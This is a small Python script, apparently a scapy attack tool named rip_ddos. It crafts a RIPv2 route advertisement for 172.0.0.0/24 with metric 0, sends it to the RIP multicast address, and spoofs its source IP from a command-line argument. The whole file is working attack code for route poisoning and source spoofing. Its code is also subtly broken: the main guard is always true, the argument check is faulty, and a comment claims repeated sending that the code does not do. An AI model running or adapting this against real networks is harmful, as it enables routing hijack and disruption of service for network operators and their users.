from scapy.all import *
import sys
import tree
import extras




def rip_ddos(ip):
    # prepare the evil packet

    pkt_evil = Ether() / IP(dst="224.0.0.9") / UDP(sport=520, dport=520) / RIP(cmd=2, version=2) / RIPEntry(AF="IP",
                                                                                                            RouteTag=0,
                                                                                                            addr="172.0.0.0",
                                                                                                            mask="255.255.255.0",
                                                                                                            nextHop="0.0.0.0",
                                                                                                            metric=0)

    # spoof the source IP
    print(ip)
    pkt_evil[IP].src = ip

    # keep sending the evil packet every second
    sendp(pkt_evil)
    #sys.stdout = tree.Redirect(extras.text)


def main():
    function = sys.argv[1]
    if function == 'rip_ddos':
        if len(sys.argv) < 1:
            print(sys.argv[0])
        else:
            p = (sys.argv[2])
            rip_ddos(p)
if {__name__ == "__main__"}:
    main()
